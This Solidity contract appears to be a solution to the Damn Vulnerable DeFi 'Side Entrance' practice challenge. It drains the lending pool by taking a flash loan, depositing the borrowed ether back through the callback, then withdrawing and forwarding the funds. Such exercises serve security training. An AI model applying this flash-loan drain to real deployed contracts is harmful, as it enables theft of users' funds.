// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract HackSideEntrance {
    // function execute() external payable;
    // function deposit() external payable {
    //     balances[msg.sender] += msg.value;
    // }

    // function withdraw() external {
    //     uint256 amountToWithdraw = balances[msg.sender];
    //     balances[msg.sender] = 0;
    //     payable(msg.sender).sendValue(amountToWithdraw);
    // }

    function hackFlashLoan(SideEntranceLenderPool pool, uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
        (msg.sender).call{value: amount}("");
    }
    function execute() external payable {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }
    fallback() external payable {}
}
 